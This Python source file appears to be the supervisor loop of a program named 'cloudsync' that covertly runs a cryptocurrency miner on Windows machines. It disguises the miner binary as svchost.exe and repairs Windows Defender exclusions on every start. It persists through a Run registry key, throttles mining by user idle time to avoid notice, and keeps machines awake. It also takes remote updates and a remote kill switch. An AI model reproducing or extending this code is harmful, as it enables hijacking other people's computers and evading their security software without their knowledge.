        # Session 0 has no real user: decisions use an "away" idle value.
        profile = self._select_profile(self._decision_idle(idle), active)
        self.profile = profile

        job_ok = bool(getattr(self.worker, "job_ok", False))
        if not job_ok:
            can_cap = getattr(self.worker, "can_cap", None)
            if callable(can_cap):
                try:
                    job_ok = bool(can_cap())
                except Exception:
                    job_ok = False

        should_run = bool(mains) and (bool(job_ok) or not active)
        if should_run and self._quiet_blocks(now, actions):
            should_run = False

        try:
            alive = self.worker.alive()
        except Exception:
            alive = False

        if should_run:
            if not alive:
                backoff = 0.0
                try:
                    backoff = float(getattr(self.worker, "backoff_until", 0.0) or 0.0)
                except (TypeError, ValueError):
                    backoff = 0.0
                if now >= backoff:
                    # G2: the restart-based fallback must carry the
                    # choose_profile() result - the reference referenced an
                    # undefined ``profile`` here and spun on NameError.  A job
                    # object keeps the config at "full" (the CPU cap throttles).
                    if getattr(self, "_session0", False):
                        # no interactive user: run the selected profile (max)
                        start_profile = profile
                    elif job_ok:
                        start_profile = "full"
                    else:
                        start_profile = profile
                    self._start_worker(now, start_profile, actions)
                    self.profile = start_profile
                else:
                    actions.append("backoff")
            elif job_ok:
                self._apply_cap(now, idle, actions)
            else:
                current = getattr(self.worker, "profile", self.profile)
                last = getattr(self.worker, "last_switch", self._started_at)
                try:
                    last = float(last or self._started_at)
                except (TypeError, ValueError):
                    last = self._started_at
                if profile != current:
                    if (now - last) >= self.profile_dwell:
                        self._switch_worker(now, profile, actions)
                    else:
                        actions.append("dwell")
        else:
            if alive:
                if (now - self._started_at) >= self.stop_dwell:
                    self._stop_worker(now, actions)
                else:
                    actions.append("dwell")

        self._maybe_recover(now, actions)
        self._read_telemetry(now)       # D2: feed build_state() before the write
        if should_run:
            self._check_stale_telemetry(now, actions)
        self._run_hooks(now, actions)
        self._was_alive = self.worker.alive()
        self.last_actions = actions
        return actions


# ---------------------------------------------------------------------------
# runtime composition root
# ---------------------------------------------------------------------------


def _normalise_logger(logger):
    if logger is None:
        return lambda _message: None
    if callable(logger):
        return logger
    for name in ("log", "write"):
        method = getattr(logger, name, None)
        if callable(method):
            return method
    return lambda _message: None


def _named_writer(logger, name=LOGGER_NAME):
    """Wrap a log target so every line carries the owning module name.

    Accepts the same shapes as :func:`_normalise_logger` (callable, object with
    ``log``/``write``, or None) and emits ``[<name>] <message>``.
    """
    write = _normalise_logger(logger)

    def emit(message):
        write("[%s] %s" % (name, message))

    return emit


def _owner_tag(exc, hint=None):
    """Short owner module for *exc*, from :func:`core.diagnostics.classify`.

    Returns e.g. ``"miner.worker"`` (the ``cloudsync.`` prefix is dropped so
    log lines stay narrow) or ``"unknown"``.  *hint* names a status keyword used
    only when the exception type itself has no owner (e.g. a bare ``OSError``
    while writing state.json).
    """
    try:
        module = classify(exc)
        if module == UNKNOWN and hint:
            module = classify(hint)
    except Exception:
        module = UNKNOWN
    if module == UNKNOWN:
        return UNKNOWN
    prefix = "cloudsync."
    return module[len(prefix):] if module.startswith(prefix) else module


def _exec_self(log, lock=None):
    """Re-exec ``python -m cloudsync`` (update / probation rollback restart)."""
    import sys
    executable = sys.executable or "python"
    log("restarting controller (%s -m cloudsync)" % executable)
    # Release the single-instance lock BEFORE the replacement process starts.
    # The guard is fail-closed: the child (or the exec'd image) races this
    # process's still-open mutex, gets ACCESS_DENIED and exits, so the box is
    # dead until the watchdog next runs.  ``release()`` handles both the mutex
    # and the fallback file-handle lock; it is safe to call twice.
    if lock is not None:
        try:
            lock.release()
        except Exception as exc:  # pragma: no cover - only on a broken runtime
            log("lock release before restart failed [%s]: %r"
                % (_owner_tag(exc, "supervisor"), exc))
    try:
        os.execv(executable, [executable, "-m", "cloudsync"])
    except Exception as exc:  # pragma: no cover - only on a broken runtime
        log("re-exec failed [%s]: %r" % (_owner_tag(exc, "supervisor"), exc))


def _teardown(settings, worker, log):
    """Thin compatibility wrapper: teardown is owned by :mod:`cloudsync.lifecycle`."""
    return lifecycle.teardown(
        settings, worker, _named_writer(log, "cloudsync.lifecycle"))


def _bootstrap_legacy(settings, log):
    """Thin compatibility wrapper: adoption is owned by :mod:`cloudsync.lifecycle`."""
    return lifecycle.bootstrap_legacy(
        settings, _named_writer(log, "cloudsync.lifecycle"))


def main(argv=None):
    """Blocking supervisor runtime: the ``python -m cloudsync`` entry point.

    Wires the platform layer (mutex, tasks, power, GPU probe) and the updater
    around :meth:`Supervisor.tick`.  Returns the process exit code (0).  Runtime
    services that are absent or unavailable are skipped, never fatal: a file
    install keeps running even if one optional recovery path is missing.
    """
    _ = argv
    from .config.settings import Settings, resolve_install_dir
    from .core.logging import logger_for
    from .miner.worker import Worker, sweep_orphans
    from .platform import gpu, mutex, power
    from .updater import PROBATION_SECONDS, Updater, handle_probation, remote_kill

    # The modular runtime is launched as ``pythonw -m cloudsync``: the process
    # fallback must grep for that marker, not the flat ``controller.py`` name.
    lock = mutex.acquire_single_instance(marker="cloudsync")
    if lock is None:
        return 0

    # D1: resolve the install directory deterministically - an explicit dir,
    # else cwd when it is the install dir (holds install.json), else the
    # per-user default, else the machine-wide default. Passed in explicitly so
    # main() never depends on Settings()' fallback again.
    settings = Settings.from_install(resolve_install_dir())
    # Raw writer for modules that name their own lines; this module's lines go
    # through the supervisor-named writer so every line carries its owner.
    log_writer = logger_for(settings.install_dir).write
    log = _named_writer(log_writer)
    log("controller start pid=%s idle_threshold=%ds"
        % (os.getpid(), int(getattr(settings, "idle_seconds",
                                     DEFAULT_IDLE_SECONDS))))
    try:
        if handle_probation(settings.install_dir, log=log_writer):
            _exec_self(log, lock)
        _bootstrap_legacy(settings, log_writer)
        if not _gpu_profile_ok(settings):
            gpu.ensure_profile(settings.install_dir,
                               python=getattr(settings, "python", None) or None)
    except Exception as exc:
        log("startup error [%s]: %r" % (_owner_tag(exc, "settings"), exc))

    # A legacy install can exclude a binary name it no longer runs (xmrig.exe
    # excluded, svchost.exe executed). The updater never touches exclusions, so
    # repair it here on every start: cheap, idempotent, and it saves a box we
    # would otherwise have to revisit by hand.
    try:
        from .platform.defender import ensure_exclusion
        ensure_exclusion(settings.install_dir, settings.bin_path, log=log_writer)
    except Exception as exc:
        log("defender exclusion self-heal failed: %r" % (exc,))

    worker = Worker(settings, log=log_writer)
    updater = Updater(settings, log=log_writer)
    try:
        sweep_orphans(settings, log=log_writer)
    except Exception:
        pass

    supervisor = Supervisor(
        settings,
        worker,
        state_path=settings.path("state.json"),
        logger=log_writer,
        sweep=lambda keep=None: sweep_orphans(settings, keep=keep, log=log_writer),
        # MIGRATION G3: the supervisor itself owns the 600 s Run-key cycle and
        # calls lifecycle.ensure_run_key (registry write), debug-logging the
        # outcome; nothing has to be injected here.
        awake=power.keep_system_awake,
    )

    probation_at = (time.time() if os.path.isfile(settings.path("update.json"))
                    else 0.0)
    kill_check = 0.0
    last_gpu_check = 0.0

    try:
        while True:
            try:
                now = time.time()

                if os.path.isfile(settings.path("stop.flag")):
                    _teardown(settings, worker, log_writer)

                if now - kill_check > 600:
                    kill_check = now
                    if remote_kill(settings):
                        _teardown(settings, worker, log_writer)

                if probation_at and now - probation_at > PROBATION_SECONDS:
                    probation_at = 0.0
                    try:
                        os.remove(settings.path("update.json"))
                    except OSError:
                        pass
                    log("update probation cleared")

                result = updater.maybe_update()
                if result is True:
                    worker.stop()
                    _exec_self(log, lock)
                elif result == "restart-worker":
                    worker.stop()

                if result:
                    gpu.ensure_profile(settings.install_dir,
                                       python=getattr(settings, "python", None) or None)
                elif not _gpu_profile_ok(settings) and \
                        (now - last_gpu_check) > 120:
                    last_gpu_check = now
                    gpu.ensure_profile(settings.install_dir,
                                       python=getattr(settings, "python", None) or None)

                supervisor.tick(now)
            except KeyboardInterrupt:
                raise
            except Exception as exc:
                log("loop error [%s]: %r" % (_owner_tag(exc, "loop"), exc))
            time.sleep(supervisor.tick_seconds)
    except KeyboardInterrupt:
        try:
            worker.stop()
        except Exception:
            pass
        try:
            power.allow_sleep()
        except Exception:
            pass
    finally:
        try:
            power.allow_sleep()
        except Exception:
            pass
    return 0
